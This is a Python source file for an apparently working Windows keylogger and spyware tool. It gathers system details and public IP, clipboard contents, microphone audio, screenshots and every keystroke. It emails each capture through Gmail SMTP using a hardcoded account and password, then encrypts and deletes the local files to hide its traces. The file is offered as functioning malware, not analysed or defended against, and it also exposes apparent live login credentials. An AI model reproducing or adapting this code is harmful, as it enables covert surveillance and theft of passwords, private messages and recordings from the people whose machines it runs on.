
import sys # provides various functions and variables that are used to manipulate different parts of the Python runtime environment
import os # prodives functions for file directory operations
import socket # defines how server and client machines can communicate at hardware level 
import platform # used to retrieve as much possible information about the platform on which the program is being currently executed.
import time # functions for getting local time
import pynput # allows to control and monitor input device
import pyscreenshot as Imagegrab # copy the contents of the screen to a Pillow image memory
from requests import get # to make a HTTP get request
import win32clipboard # module to support window clipbaird API
import sounddevice as sd # it provides bindings for the port audio library from and into NumPy arrays containing audio signal 
from pynput.keyboard import Key, Listener #   contains classes for controlling and monitoring the keyboard
from scipy.io.wavfile import write  # Writes a simple uncompressed WAV file. 
import smtplib #  defines an SMTP client session object that can be used to send mail to any internet machine with an SMTP listner deamon
from email.mime.multipart import MIMEMultipart # Multipurpose Internet Mail Extensions multipart -> A subclass of MIMEBase Optional _subtype defaults to mixed, but can be used to specify the subtype of the message
from email.mime.text import MIMEText # the MIMEText class is used to create MIME objects of major type text.
from email.mime.base import MIMEBase # This is the base class for all the MIME-specific subclasses of Message.
from email import encoders #  encoders are actually used by the MIMEAudio and MIMEImage class constructors to provide default encodings. All encoder functions take exactly one argument, the message object to encode
from cryptography.fernet import Fernet #  The fernet module of the cryptography package has inbuilt functions for the generation of the key, encryption of plaintext into ciphertext, and decryption of ciphertext into
# plaintext using the encrypt and decrypt methods respectively. 

#Creating Instance of files
key = "82olTZAI0eQB5DjBDaii9u09tP9xbv0-BGxyvuUmjnU="

keys_info = "keys.txt"
system_info = "system.txt"
audio_info = "audio.wav"
clipboard_info = "clipboard.txt"
screenshot_info = "screenshot.png"



file_path = "C:\\Users\\Aseem\Desktop\\New_folder\\keylogger"
files = [file_path + keys_info, file_path + system_info, file_path + audio_info, file_path + clipboard_info, file_path + screenshot_info]

#Send Mail
def send_mail(filename, attachment):
    fromaddr = "ccomputing3@gmail.com"
    toaddr = "ccomputing3@gmail.com"

    msg = MIMEMultipart() # creating the object of MIMEMultipart class MIMEMultipart object to the msg variable after initializing it. build message contents

    msg['From'] = fromaddr 
    msg['To'] = toaddr
    msg['Subject'] = "Details"

    body = "Body"

    msg.attach(MIMEText(body, 'plain')) # The MIMEText function will be used to attach text.
    filename = filename
    attachment = open(attachment, "rb")
  
    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())
    encoders.encode_base64(p)
   
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, "erfkzdlmimvbdiob")
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)  
    s.quit()

#Get System Info
def computer_info():
    with open(file_path + system_info, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP = " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get public IP")

        f.write("Processor: " + (platform.processor() + '\n'))
        f.write("System: " + (platform.system()) + '\n')
        f.write("Machine: " + (platform.machine()) + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')
computer_info()
send_mail(system_info, file_path + system_info)
       
#Copy from cilpboard
def clipboard():
    with open(file_path + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Copied Data: " + pasted_data)
        except:
            f.write("Clipboard cannot be copied")
clipboard()
send_mail(clipboard_info, file_path + clipboard_info)

#Record Audio
def microphone():
    fs = 44100
    duration = 20
    myrec = sd.rec(int(duration * fs), samplerate=fs, channels= 2)
    sd.wait()

    write(file_path + audio_info, rate= fs, data= myrec)
microphone()
send_mail(audio_info, file_path + audio_info)

#Get Screenshot
def screenshot():
    img = Imagegrab.grab()
    img.save(file_path + screenshot_info)
screenshot()
send_mail(screenshot_info, file_path + screenshot_info)

#Log Keys
keys = []
count = 0

def on_press(key):
    global keys, count, current_window
    
    keys.append(key)
    count += 1
    #process_info = get_current_process()
    #print ("\n\n%s - %s" % (process_info[0], process_info[1]))
    print("{0} pressed".format(key))
    #print(keys)
    

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

#Store keys into file
def write_file(keys):
    with open(file_path + keys_info, "a") as f:
        try:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write(" ")
                elif k.find("enter") > 0:
                    f.write("\n")
                #elif k.find("backspace") > 0:
                    #f.write("\b")
                elif k.find("Key") == -1:
                    f.write(str(k))
                    #f.close()
        except:
            print("Unexpected error: ", sys.exc_info())

def on_release(key):
    if key == Key.esc:
        send_mail(keys_info, file_path + keys_info)
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join() 

time.sleep(20)

#Encrypting files
encrypted_files_names = [file_path + keys_info, file_path + system_info, file_path + audio_info, file_path + clipboard_info, file_path + screenshot_info]

count = 0
try:
    for encrypting_file in files:
        with open(files[count], 'rb') as f:
            data = f.read()
            fernet = Fernet(key)
            encrypted = fernet.encrypt(data)
        with open(files[count], 'wb') as f:
            f.write(encrypted)
        send_mail(encrypted_files_names[count], encrypted_files_names[count])
        count += 1
except:
    print("Unexpected error: ", sys.exc_info())

time.sleep(120)

#Delete files
files = [keys_info, system_info, audio_info, clipboard_info, screenshot_info]
for file in files:
    os.remove(file_path + file)
